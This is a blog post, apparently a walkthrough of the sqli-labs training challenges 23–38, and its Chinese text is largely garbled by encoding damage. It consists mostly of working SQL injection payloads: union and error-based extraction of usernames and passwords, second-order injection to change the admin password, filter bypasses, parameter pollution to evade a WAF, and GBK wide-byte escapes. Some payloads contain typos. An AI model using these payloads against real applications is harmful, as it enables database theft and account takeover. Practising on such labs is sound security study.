<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title>sqli-labs 23-40 | Gridea</title>
<meta name="description" content="æ¸©æ•…è€ŒçŸ¥æ–°">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1627392112619">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
<link rel="stylesheet" href="https://jinqipiaopiao.github.io//styles/main.css">


<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>


<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />


  </head>
  <body>
  
    <nav class="navbar border fixed split-nav">
  <div class="nav-brand">
    <h3><a href="https://jinqipiaopiao.github.io/">Gridea</a></h3>
  </div>
  <div class="collapsible">
    <input id="collapsible1" type="checkbox" name="collapsible1">
    <button>
      <label for="collapsible1">
        <div class="bar1"></div>
        <div class="bar2"></div>
        <div class="bar3"></div>
      </label>
    </button>
    <div class="collapsible-body">
      <ul class="inline">
        
          <li>
            
              <a href="/" class="menu">
                é¦–é¡µ
              </a>
            
          </li>
        
          <li>
            
              <a href="/archives" class="menu">
                å½’æ¡£
              </a>
            
          </li>
        
          <li>
            
              <a href="/tags" class="menu">
                æ ‡ç­¾
              </a>
            
          </li>
        
          <li>
            
              <a href="/post/about" class="menu">
                å…³äº
              </a>
            
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div id="top" class="row site">
      <div class="sm-12 md-8 col">
        <div class="paper">
          <article class="article">
            <h1>sqli-labs 23-40</h1>
            <p class="article-meta">
              2021-04-14
              
            </p>
            
            <div class="post-content">
              <h1 id="less-23è¿‡æ»¤æ³¨é‡Šçš„getå‹æ³¨å…¥">less-23â€”â€”è¿‡æ»¤æ³¨é‡Šçš„GETå‹æ³¨å…¥</h1>
<p>å­—æ®µå</p>
<pre><code>?id=0' union select 1,2,3 '  å‡ºç°çš„æ•°å­—æ˜¯æœ€å¤§çš„å­—æ®µä¸º3
</code></pre>
<p>æ•°æ®åº“å</p>
<pre><code>?id=0' union select 1,2,(select group_concat(schema_name) from information_schema.schemata) ' 
</code></pre>
<p>è¡¨å</p>
<pre><code>?id=0' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema = database()) '
</code></pre>
<p>åˆ—å</p>
<pre><code>?id=0' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users') '
</code></pre>
<p>æ•°æ®</p>
<pre><code>?id=0' union select 1,2,(select group_concat(username) from users) '
</code></pre>
<h1 id="less-24-äºŒæ¬¡æ³¨å…¥">less-24-äºŒæ¬¡æ³¨å…¥</h1>
<p>é¦–å…ˆå…ˆåˆ›å»ºä¸€ä¸ªç”¨æˆ· æ³¨æ„æ‰¾new user<br>
ç„¶åè¾“å…¥æ•°æ®</p>
<pre><code>username=admin'#
passwd=123
</code></pre>
<p>ç„¶åä¼šæ˜¾ç¤ºæˆåŠŸ<br>
ç„¶åå†ç™»å½•è¿›å»ä¿®æ”¹å¯†ç ä¿®æ”¹æˆ123456åˆ™åŸæ¥adminç”¨æˆ·çš„å¯†ç å¾—åˆ°äº†æ”¹å˜</p>
<h1 id="less-25-è¿‡æ»¤orand">less-25-è¿‡æ»¤[or,and]</h1>
<p>æ³¨å…¥ç‚¹[']<br>
æ•°æ®åº“å</p>
<pre><code>?id=0' || extractvalue(1,concat(0x7e,(select database()),0x7e)) --+ å•ä¸ªæ•°æ®åº“
?id=0' || extractvalue(1,concat(0x7e,(select group_concat(schema_name) from infoorrmation_schema.schemata),0x7e)) --+ å¤šä¸ªæ•°æ®åº“
</code></pre>
<p>è¡¨å</p>
<pre><code>?id=0' || extractvalue(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()),0x7e)) --+
</code></pre>
<p>åˆ—å</p>
<pre><code>?id=0' || extractvalue(1,concat(0x7e,(select group_concat(column_name) from infoorrmation_schema.columns where table_name='users'),0x7e)) --+
</code></pre>
<p>æ•°æ®</p>
<pre><code>?id=0' || extractvalue(1,concat(0x7e,(select group_concat(username) from users),0x7e)) --+
</code></pre>
<h1 id="less-25a-è¿‡æ»¤orand">less-25a-è¿‡æ»¤[or,and]</h1>
<p>åˆ¤æ–­æ•°æ®å­—æ®µ</p>
<pre><code>?id=0 union select 1,2,3   passwordæ˜¾ç¤ºçš„æ˜¯æœ€å¤§å­—æ®µ
</code></pre>
<p>æ•°æ®åº“å</p>
<pre><code>?id=0 union select 1,2,(select group_concat(schema_name) from infoorrmation_schema.schemata)
</code></pre>
<p>è¡¨å</p>
<pre><code>?id=0 union select 1,2,(select group_cocat(table_name) from infoorrmation_schema.tables where table_schema=database())
</code></pre>
<p>åˆ—å</p>
<pre><code>?id=0 union select 1,2,(select group_concat(column_name) from infoorrmation_schema.columns where table_name='users')
</code></pre>
<p>æ•°æ®</p>
<pre><code>?id=0 union select1,2,(select group_concat(username) from users)
</code></pre>
<h1 id="less-26-trick-with-comments-and-space-è¿‡æ»¤äº†æ³¨é‡Šå’Œç©ºæ ¼çš„æ³¨å…¥">less-26-Trick with comments and space (è¿‡æ»¤äº†æ³¨é‡Šå’Œç©ºæ ¼çš„æ³¨å…¥)</h1>
<p>å•å¼•å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸¤ä¸ªå•å¼•å·åˆ†åˆ«é—­åˆå‰åçš„å¼•å·ã€‚ç½‘é¡µå›æ˜¾æ­£å¸¸çš„å†…å®¹ï¼Œè¯´æ˜è¯¥ç½‘é¡µå­˜åœ¨å•å¼•å·é—­åˆçš„å­—ç¬¦å‹æ³¨å…¥<br>
åˆ¤æ–­ä»€ä¹ˆç±»å‹</p>
<pre><code>?id=0' || 1=1 å’Œ ?id=0' || 1=2 å›æ˜¾é”™è¯¯
ç„¶å ?id=0' || '1'='2å›æ˜¾é”™è¯¯
æœ€å ?id=0' || '1'='1å›æ˜¾æ­£ç¡®
</code></pre>
<p>æ•°æ®åº“å</p>
<pre><code>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ updatexml() æŠ¥é”™æ³¨å…¥ï¼Œå› ä¸ºè¿™ç§æ‰‹æ³•ä¸éœ€è¦è€ƒè™‘ç©ºæ ¼çš„é—®é¢˜ã€‚çˆ†æ•°æ®åº“åã€‚
å¤šæ¡æ•°æ®åº“ï¼š?id=0' || updatexml(1,concat(0x7e,(select (group_concat(schema_name)) from (infoorrmation_schema.schemata))),1) || '1'='1
å•æ¡æ•°æ®åº“ï¼š?id=0' || updatexml(1,concat(0x7e,database()),1) || '1'='1
</code></pre>
<p>è¡¨å</p>
<pre><code>?id=0' || updatexml(1,concat(0x7e,(select (group_concat(table_name)) from (infoorrmation_schema.tables) where (table_schema=database()),0x7e)) || '1'='1
</code></pre>
<p>åˆ—å</p>
<pre><code>?id=0' || updatexml(1,concat(0x7e,(select (group_concat(column_name)) from (infoorrmation_schema.columns) where (table_name='users'))),1) || '1'='1
</code></pre>
<p>æ•°æ®</p>
<pre><code>?id=0' || updatexml(1,concat(0x7e,(select (group_concat(username)) from (users))),1) || '1'='1
</code></pre>
<p>Less 26a-GET-Blind Based-All your SPACES and COMMENTS belong to us (è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šçš„ç›²æ³¨)<br>
ç”±äºæŠ¥é”™ä¿¡æ¯ä¸å›æ˜¾ï¼Œæ‰€ä»¥ updatexml() æŠ¥é”™æ³¨å…¥ä¸èƒ½ä½¿ç”¨ã€‚æ­¤å¤„å°±éœ€è¦ä½¿ç”¨ URL ç¼–ç æ¥ä»£æ›¿ç©ºæ ¼ï¼Œç„¶åç”¨ UNION æ³¨å…¥ã€‚åˆ¤æ–­æœ‰å‡ åˆ—å¯ç”¨ï¼Œåˆ«å¿˜äº† â€œORDERâ€ ä¸­çš„ â€œorâ€ è¢«è¿‡æ»¤æ‰äº†ã€‚</p>
<h1 id="åˆ¤æ–­æ³¨å…¥ç±»å‹">åˆ¤æ–­æ³¨å…¥ç±»å‹</h1>
<p>æ³¨å…¥æ­£å¸¸çš„å‚æ•°ï¼Œç½‘é¡µè¿”å›å¯¹åº” id çš„æ­£å¸¸ä¿¡æ¯ï¼Œæ³¨å…¥ä¸¤ä¸ªå•å¼•å·åˆ†åˆ«é—­åˆå‰åçš„å¼•å·ã€‚ç½‘é¡µå›æ˜¾æ­£å¸¸çš„å†…å®¹ï¼Œè¯´æ˜è¯¥ç½‘é¡µå­˜åœ¨å•å¼•å·é—­åˆçš„å­—ç¬¦å‹æ³¨å…¥</p>
<pre><code>?id=1 å’Œ ?id=1'' å›æ˜¾æ­£ç¡®
</code></pre>
<p>å°è¯•æ„é€ å·¦å³åŠè¾¹çš„ç©ºæ ¼æ¥é—­åˆï¼Œç½‘é¡µå›æ˜¾æ­£å¸¸ï¼Œè¯´æ˜å‚æ•°æœ‰ä½¿ç”¨å•å±‚æ‹¬å·æ¥é—­åˆã€‚</p>
<pre><code>?id=1') || ('1
</code></pre>
<h1 id="åˆ¤æ–­æ•°æ®å­—æ®µ">åˆ¤æ–­æ•°æ®å­—æ®µ</h1>
<pre><code>?id=0')%a0oorrder%a0by%a03||('1
</code></pre>
<p>æ•°æ®åº“</p>
<pre><code>?id=0')%a0union%a0select%a01,database(),3%a0||('1
</code></pre>
<p>è¡¨å</p>
<pre><code>?id=0')%a0union%a0select%a01,group_concat(table_name),3%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=database()||('1
</code></pre>
<p>åˆ—å</p>
<pre><code>?id=0')%a0union%a0select%a01,group_concat(column_name),3%a0from%a0infoorrmation_schema.columns%a0where%a0table_name='users'||('1
</code></pre>
<p>æ•°æ®</p>
<pre><code>?id=0')%a0UNION%a0SELECT%a01,group_concat(concat_ws(&quot;:&quot;,username,passwoORrd)),3%a0FROM%a0users%a0WHERE%a0('1
</code></pre>
<p>#Less-27 è¿‡æ»¤ã€ /ã€*ã€â€“ã€#ã€ +ã€ç©ºæ ¼+ã€selectã€Selectã€SELECTã€unionã€Unionã€UNIONã€ã€‘<br>
æ³¨å…¥ç‚¹ã€ â€™ ã€‘<br>
æ£€æµ‹æ˜¯ä»€ä¹ˆæ³¨å…¥</p>
<pre><code>æµ‹è¯•?id=1 and 1=1 å’Œ ?id=1 and 1=2å›æ˜¾ç›¸åŒä¸”å›æ˜¾æ­£ç¡®è¯´æ˜ä¸æ˜¯æ•°å­—å‹æ³¨å…¥
æµ‹è¯•?id=1' and '1'='1 å’Œ ?id=1' and '1'='2å›æ˜¾ä¸åŒè¯´æ˜æ˜¯å­—ç¬¦å‹æ³¨å…¥
</code></pre>
<p>æ£€æµ‹å­—æ®µ</p>
<pre><code>?id=1'%a0unIon%a0seLect%a01,2,3'
</code></pre>
<p>è¡¨å</p>
<pre><code>?id='%a0unIon%a0SeLect%a01,group_concat(table_name),3%a0from%a0information_schema.tables%a0where%a0table_schema=database()%a0||'1
</code></pre>
<p>åˆ—å</p>
<pre><code>?id='%a0unIon%a0SeLect%a01,group_concat(column_name),3%a0from%a0information_schema.columns%a0where%a0table_name='users'%a0||'1
</code></pre>
<p>æ•°æ®</p>
<pre><code>?id=0'%a0unIon%a0SeLect%a01,group_concat(concat_ws(&quot;:&quot;,username,password)),3%a0from%a0users%a0where%a0'1
</code></pre>
<p>#Less-27a è¿‡æ»¤ã€ /ã€*ã€â€“ã€#ã€ +ã€ç©ºæ ¼+ã€selectã€Selectã€SELECTã€unionã€Unionã€UNIONã€ã€‘<br>
æ³¨å…¥ç‚¹ã€ &quot; ã€‘<br>
æŸ¥è¯¢å­—æ®µ<br>
Your Password:3è¿™ä¸ªæ˜¾ç¤ºçš„å°±æ˜¯æœ€å¤§å­—æ®µä¸º3</p>
<pre><code>?id=&quot;%a0unIon%a0SelECT%a01,2,3&quot; 
</code></pre>
<p>æŸ¥è¯¢æ•°æ®åº“å</p>
<pre><code>?id=&quot;%a0unIon%a0SelEct%a01,database(),3&quot;
</code></pre>
<p>æŸ¥è¯¢è¡¨å</p>
<pre><code>?id=&quot;%a0UnIon%a0SelEct%a01,group_concat(table_name),3%a0from%a0information_schema.tables%a0where%a0table_schema=database()||&quot;
</code></pre>
<p>æŸ¥è¯¢åˆ—å</p>
<pre><code>?id=&quot;%a0UnIOn%a0SelEct%a01,group_concat(column_name),3%a0from%a0information_schema.columns%a0where%a0table_name='users'||&quot;
</code></pre>
<p>æŸ¥è¯¢æ•°æ®</p>
<pre><code>?id=0&quot;%a0unIon%a0SeLect%a01,group_concat(concat_ws(&quot;:&quot;,username,password)),3%a0from%a0users%a0where%a0&quot;1
</code></pre>
<h1 id="less-28-è¿‡æ»¤-ç©ºæ ¼-unionsselectiç»„åˆå‹æ‹¼æ¥union-select">Less-28 è¿‡æ»¤ã€ /*ã€â€“ã€#ã€ +ã€ç©ºæ ¼+ã€/union\s+select/iï¼ˆç»„åˆå‹æ‹¼æ¥ï¼šunion selectï¼‰ã€‘</h1>
<p>æ³¨å…¥ç‚¹ã€ ') ã€‘<br>
æ£€æµ‹æ˜¯ä»€ä¹ˆç±»å‹</p>
<pre><code>?id=1')and('1')=('1å›æ˜¾æ­£å¸¸
?id=1')and('1')=('2å›æ˜¾é”™è¯¯
è¯´æ˜å°±æ˜¯')ç±»å‹
</code></pre>
<p>æŸ¥è¯¢æ•°æ®åº“åç§°</p>
<pre><code>?id=0')union%a0select%a01,database(),('
</code></pre>
<p>æŸ¥è¯¢è¡¨</p>
<pre><code>?id=')union%a0select%a01,group_concat(table_name),3%a0from%a0information_schema.tables%a0where%a0table_schema=database()||('1
</code></pre>
<p>æŸ¥è¯¢åˆ—å</p>
<pre><code>?id=')union%a0select%a01,group_concat(column_name),3%a0from%a0information_schema.columns%a0where%a0table_name='users'||('
</code></pre>
<p>æŸ¥è¯¢æ•°æ®</p>
<pre><code>?id=')union%a0select%a01,group_concat(concat_ws(&quot;:&quot;,username,password)),3%a0from%a0users%a0where('1
</code></pre>
<h1 id="less-28-è¿‡æ»¤-ç©ºæ ¼-unionsselectiç»„åˆå‹æ‹¼æ¥union-select-2">Less-28 è¿‡æ»¤ã€ /*ã€â€“ã€#ã€ +ã€ç©ºæ ¼+ã€/union\s+select/iï¼ˆç»„åˆå‹æ‹¼æ¥ï¼šunion selectï¼‰ã€‘</h1>
<p>æ³¨å…¥ç‚¹ã€ ') ã€‘<br>
åˆ¤æ–­æ˜¯ä»€ä¹ˆç±»å‹</p>
<pre><code>?id=1') and ('1')=('2    å›æ˜¾é”™è¯¯
?id=1') and ('1')=('1    å›æ˜¾æ­£ç¡®
</code></pre>
<p>æŸ¥æ•°æ®åº“</p>
<pre><code>?id=0')%a0union%a0select%a01,database(),3%a0||('
</code></pre>
<p>æŸ¥è¡¨å</p>
<pre><code>?id=0')%a0union%a0select%a01,group_concat(table_name),3%a0from%a0information_schema.tables%a0where%a0table_schema=database()%a0||('
</code></pre>
<p>æŸ¥åˆ—å</p>
<pre><code>?id=0')%a0union%a0select%a01,group_concat(column_name),3%a0from%a0information_schema.columns%a0where%a0table_name='users'%a0||('
</code></pre>
<p>æŸ¥æ•°æ®</p>
<pre><code>?id=')union%a0select%a01,group_concat(concat_ws(&quot;:&quot;,username,password)),3%a0from%a0users%a0where('
</code></pre>
<h1 id="less-29">Less-29</h1>
<p>çŸ¥è¯†ç‚¹ï¼š<br>
â€‹ 1.æœåŠ¡å™¨ç«¯æœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼šç¬¬ä¸€éƒ¨åˆ†ä¸º tomcat ä¸ºå¼•æ“çš„ jsp å‹æœåŠ¡å™¨ï¼Œç¬¬äºŒéƒ¨åˆ†ä¸º apache ä¸ºå¼•æ“çš„ php æœåŠ¡å™¨ï¼ŒçœŸæ­£æä¾› web æœåŠ¡çš„æ˜¯ php æœåŠ¡å™¨ã€‚</p>
<p>å·¥ä½œæµç¨‹ä¸ºï¼šclient è®¿é—®æœåŠ¡å™¨ï¼Œèƒ½ç›´æ¥è®¿é—®åˆ° tomcat æœåŠ¡å™¨ï¼Œç„¶å tomcat æœåŠ¡å™¨å†å‘ apache æœåŠ¡å™¨è¯·æ±‚æ•°æ®ã€‚æ•°æ®è¿”å›è·¯å¾„åˆ™ç›¸åã€‚</p>
<p>æ¥ä¸‹æ¥æ˜¯å‚æ•°è§£æçš„é—®é¢˜ã€‚ é—®ï¼šindex.php?id=1&amp;id=2ï¼Œè¿™æ—¶å›æ˜¾æ˜¯id=1è¿˜æ˜¯id=2å‘¢ï¼Ÿ ç­”ï¼šapache (php) è§£ææœ€åä¸€ä¸ªå‚æ•°ï¼Œå³å›æ˜¾id=2ï¼›tomcat (jsp) è§£æç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³å›æ˜¾id=1ã€‚</p>
<p>æœåŠ¡å™¨ç«¯æœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼šç¬¬ä¸€éƒ¨åˆ†ä¸º tomcat ä¸ºå¼•æ“çš„ jsp å‹æœåŠ¡å™¨ï¼Œç¬¬äºŒéƒ¨åˆ†ä¸º apache ä¸ºå¼•æ“çš„ php æœåŠ¡å™¨ï¼ŒçœŸæ­£æä¾› web æœåŠ¡çš„æ˜¯ php æœåŠ¡å™¨ã€‚</p>
<p>å·¥ä½œæµç¨‹ä¸ºï¼šclient è®¿é—®æœåŠ¡å™¨ï¼Œèƒ½ç›´æ¥è®¿é—®åˆ° tomcat æœåŠ¡å™¨ï¼Œç„¶å tomcat æœåŠ¡å™¨å†å‘ apache æœåŠ¡å™¨è¯·æ±‚æ•°æ®ã€‚æ•°æ®è¿”å›è·¯å¾„åˆ™ç›¸åã€‚</p>
<p>æ¥ä¸‹æ¥æ˜¯å‚æ•°è§£æçš„é—®é¢˜ã€‚ é—®ï¼šindex.php?id=1&amp;id=2ï¼Œè¿™æ—¶å›æ˜¾æ˜¯id=1è¿˜æ˜¯id=2å‘¢ï¼Ÿ ç­”ï¼šapache (php) è§£ææœ€åä¸€ä¸ªå‚æ•°ï¼Œå³å›æ˜¾id=2ï¼›tomcat (jsp) è§£æç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³å›æ˜¾id=1ã€‚</p>
<p>é—®ï¼šindex.jsp?id=1&amp;id=2ï¼Œé’ˆå¯¹è¿™å…³çš„ä¸¤å±‚ç»“æ„ï¼Œå®¢æˆ·ç«¯è¯·æ±‚é¦–å…ˆè¿‡ tomcatï¼Œtomcat è§£æç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ¥ä¸‹æ¥ tomcat è¯·æ±‚ apacheï¼Œapache è§£ææœ€åä¸€ä¸ªå‚æ•°ã€‚é‚£ä¹ˆæœ€ç»ˆè¿”å›å®¢æˆ·ç«¯çš„æ˜¯å“ªä¸ªå‚æ•°ï¼Ÿ ç­”ï¼šæ­¤å¤„åº”è¯¥è¿˜æ˜¯id=2ï¼Œå› ä¸ºå®é™…ä¸Šæä¾›æœåŠ¡çš„æ˜¯ apache æœåŠ¡å™¨ï¼Œè¿”å›çš„æ•°æ®ä¹Ÿåº”è¯¥æ˜¯ apache å¤„ç†çš„æ•°æ®ã€‚</p>
<p>è€Œåœ¨æˆ‘ä»¬å®é™…åº”ç”¨ä¸­ï¼Œä¹Ÿæ˜¯æœ‰ä¸¤å±‚æœåŠ¡å™¨çš„æƒ…å†µï¼Œé‚£ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšï¼Ÿæ˜¯å› ä¸ºæˆ‘ä»¬å¾€å¾€åœ¨ tomcat æœåŠ¡å™¨å¤„åšæ•°æ®è¿‡æ»¤å’Œå¤„ç†ï¼ŒåŠŸèƒ½ç±»ä¼¼ä¸ºä¸€ä¸ª WAFã€‚</p>
<p>è€Œæ­£å› ä¸ºè§£æå‚æ•°çš„ä¸åŒï¼Œæˆ‘ä»¬æ­¤å¤„å¯ä»¥åˆ©ç”¨è¯¥åŸç†ç»•è¿‡ WAF çš„æ£€æµ‹ã€‚å¦‚ payloadï¼šindex.jsp?id=1&amp;id=0 or 1=1â€“+ï¼Œtomcat åªæ£€æŸ¥ç¬¬ä¸€ä¸ªå‚æ•°id=1ï¼Œè€Œå¯¹ç¬¬äºŒä¸ªå‚æ•°id=0 or 1=1â€“+ä¸åšæ£€æŸ¥ï¼Œç›´æ¥ä¼ ç»™äº† apacheï¼Œapache æ°å¥½è§£æç¬¬äºŒä¸ªå‚æ•°ï¼Œä¾¿è¾¾åˆ°äº†æ”»å‡»çš„ç›®çš„ã€‚</p>
<p>è¯¥ç”¨æ³•å°±æ˜¯ HPPï¼ˆHTTP Parameter Pollutionï¼‰å³ HTTP å‚æ•°æ±¡æŸ“æ”»å‡»çš„ä¸€ä¸ªåº”ç”¨ã€‚HPP å¯å¯¹æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯éƒ½èƒ½å¤Ÿé€ æˆä¸€å®šçš„å¨èƒã€‚</p>
<p>â€‹ â€”-æ¥æºMySQLæ³¨å…¥å¤©ä¹¦ä¹‹æœåŠ¡å™¨ä¸¤å±‚æ¶æ„</p>
<p>Payload:<br>
â€‹ 1.åœ¨å¼€å§‹å‰é€‰æ‹©login.phpæ–‡ä»¶ï¼Œå¦åˆ™ä¸ç¬¬ä¸€å…³ä¸€æ ·äº†</p>
<pre><code>login.php?id=1&amp;id=-1â€™ union select 1,database(),3 â€“+ ,ç„¶åé€æ­¥æ³¨å…¥ã€‚
</code></pre>
<h1 id="less-30">Less-30</h1>
<p>â€‹ 1.idçš„åŒ…è£¹å˜ä¸º â€œ å…¶ä»–ä¸ä¸Šä¸€å…³ä¸€æ ·ã€‚</p>
<pre><code>login.php?id=1&amp;id=-1â€ union select 1,database(),3 â€“+
</code></pre>
<h1 id="less-31">Less-31</h1>
<p>â€‹ 2.idçš„åŒ…è£¹å˜ä¸º â€œ) å…¶ä»–ä¸ä¸Šä¸€å…³ä¸€æ ·ã€‚</p>
<pre><code>login.php?id=1&amp;id=-1&quot;) union select 1,database(),3 â€“+    
</code></pre>
<h1 id="less-32">Less-32</h1>
<p>â€‹ 1.å®½å­—èŠ‚æ³¨å…¥ã€‚</p>
<pre><code>function check_addslashes($string)
{
$string = preg_replace('/'. preg_quote('\\') .'/', &quot;\\\\\\&quot;, $string);  //escape any backslash
$string = preg_replace('/\'/i', '\\\'', $string);   //escape single quote with a backslash
$string = preg_replace('/\&quot;/', &quot;\\\&quot;&quot;, $string);//escape double quote with a backslash


return $string;
}
</code></pre>
<p>å¯¹ /, â€˜, â€œ è¿›è¡Œäº†è¿‡æ»¤ã€‚</p>
<p>â€‹ é€šå¸¸ï¼Œä¸€ä¸ªGBKç¼–ç æ±‰å­—ï¼Œå ç”¨2ä¸ªå­—èŠ‚ã€‚</p>
<p>â€‹ mysqlåœ¨ä½¿ç”¨GBKç¼–ç æ—¶ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸ºä¸€ä¸ªæ±‰å­—ã€‚ä¾‹å¦‚%aa%5cå°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼ˆå‰ä¸€ä¸ªasciiç å¤§äº128æ‰èƒ½åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ã€‚</p>
<p>â€‹ åœ¨%5c%27å‰æ·»åŠ %dfæ„æˆ%df%5c%27 (%5c : \çš„ç¼–ç ï¼Œ%27ï¼šâ€™çš„ç¼–ç )ï¼Œmysqlåœ¨GBKç¼–ç æ—¶ï¼Œä¼šå°†ä¸¤ä¸ªå­—èŠ‚(%df%5c)å½“ä½œä¸€ä¸ªæ±‰å­—ï¼Œä»è€Œå°†\å»é™¤ã€‚ (ä¹Ÿå¯ä»¥ä½¿ç”¨ %bf, %81,%82ç­‰)</p>
<p>Payload:</p>
<pre><code>â€‹ 1.?id=1%dfâ€™ ,å¾—åˆ°è¯­æ³•é”™è¯¯æç¤º idä¸º â€˜ åŒ…è£¹ã€‚

â€‹ 2.?id=1%dfâ€™ order by x â€“+ (x=1,2,3,4) åˆ¤æ–­å­—æ®µã€‚

â€‹ 3.?id=0%dfâ€™ union select 1,2,3 â€“+ ,çœ‹å›æ˜¾ä½ç½®ã€‚ç„¶ååŒä¹‹å‰æ­¥éª¤è§£å†³ã€‚

â€‹ 4.æŸ¥è¯¢åˆ—åæ—¶é‡‡ç”¨16è¿›åˆ¶ç»•è¿‡â€™â€˜éœ€æ±‚ï¼Œå°† users è½¬æ¢ä¸º16è¿›åˆ¶ï¼Œå…¶ä»–ç…§å¸¸ã€‚
?id=0%df' union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273--+
</code></pre>
<h1 id="less-33">Less-33</h1>
<p>â€‹ addslashes()å‡½æ•°ï¼Œaddslashes(string)è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰å®¶åæ–œæ \å­—ç¬¦ä¸²ï¼š<br>
å•å¼•å· â€™<br>
åŒå¼•å· â€œ<br>
åæ–œæ  <br>
ç©ºå­—ç¬¦ null</p>
<p>æ³¨å…¥å’Œä¸Šä¸€å…³ä¸€æ ·ã€‚</p>
<h1 id="less-34">Less-34</h1>
<p>æ‰€ä»¥éœ€è¦å¯¹%dfè¿›è¡Œä¼˜å…ˆè§£ç ï¼Œ%dfè§£ç åä¸º ï¿½ï¼Œæ‰€ä»¥é—­åˆç¬¦å·ä¸º ï¿½'</p>
<pre><code>uname=123ï¿½' union select 1,2#&amp;passwd=admin&amp;submit=Submit æ£€æµ‹å‡ºå­—æ®µä¸º2
uname=123ï¿½' union select 1,group_concat(schema_name) from information_schema.schemata#&amp;passwd=admin&amp;submit=Submit
uname=123ï¿½' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;passwd=admin&amp;submit=Submit
uname=123ï¿½' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#&amp;passwd=admin&amp;submit=Submit
uname=123ï¿½' union select 1,group_concat(username) from users#&amp;passwd=admin&amp;submit=Submit
</code></pre>
<h1 id="less-35">Less-35</h1>
<pre><code>?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata
?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273
?id=-1 union select 1,group_concat(username),3 from users
</code></pre>
<h1 id="less-36">Less-36</h1>
<pre><code>?id=-1%df' union select 1,2,group_concat(username) from users --+
?id=-1%df' union select 1,2,group_concat(schema_name) from information_schema.schemata --+

?id=-1%df' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+
?id=-1%df' union select 1,2,group_concat(username,password) from users --+
</code></pre>
<h1 id="less-37">Less-37</h1>
<p>æ‰€ä»¥éœ€è¦å¯¹%dfè¿›è¡Œä¼˜å…ˆè§£ç ï¼Œ%dfè§£ç åä¸º ï¿½ï¼Œæ‰€ä»¥é—­åˆç¬¦å·ä¸º ï¿½'</p>
<pre><code>uname=123ï¿½' union select 1,2#&amp;passwd=admin&amp;submit=Submit æ£€æµ‹å‡ºå­—æ®µä¸º2
uname=123ï¿½' union select 1,group_concat(schema_name) from information_schema.schemata#&amp;passwd=admin&amp;submit=Submit
uname=123ï¿½' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;passwd=admin&amp;submit=Submit
uname=123ï¿½' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#&amp;passwd=admin&amp;submit=Submit
uname=123ï¿½' union select 1,group_concat(username) from users#&amp;passwd=admin&amp;submit=Submit
</code></pre>
<h1 id="less-38">Less-38</h1>
<p>å †å æ³¨å…¥ï¼š</p>
<ul>
<li>ä»‹ç»ä¸åŸç†:<br>
â€‹ å¯ä»¥ç†è§£ä¸ºå¤šæ¡SQLè¯­å¥ä¸€èµ·ä½¿ç”¨ã€‚ï¼ˆMySQLçš„å¤šè¯­å¥æŸ¥è¯¢ï¼‰åœ¨SQLä¸­ï¼Œåˆ†å·(ğŸ˜‰ æ˜¯è¯­å¥ç»“æŸçš„æ ‡å¿—ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸€æ¡è¯­å¥çš„åæ–¹åŠ ä¸Š; ç»§ç»­æ„é€ ä¸‹ä¸€è¯­å¥ã€‚</li>
</ul>
<p>â€‹ å †å è¯­å¥ä¸unionè”åˆæ³¨å…¥åŒºåˆ«ä¸ºï¼šunionæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œä»»æ„è¯­å¥ã€‚</p>
<p>â€‹ å †å æ³¨å…¥ä¹‹å‰è¦çŸ¥é“æ•°æ®åº“çš„ä¸€äº›ç›¸å…³ä¿¡æ¯ï¼Œå¦‚ï¼šè¡¨åï¼Œåˆ—åç­‰ä¿¡æ¯ã€‚ å› ä¸ºä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤å †å æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–ç»“æœåªèƒ½è¢«å¿½ç•¥ï¼Œæˆ‘ä»¬åœ¨å‰ç«¯ç•Œé¢æ— æ³•çœ‹åˆ°è¿”å›ç»“æœã€‚</p>
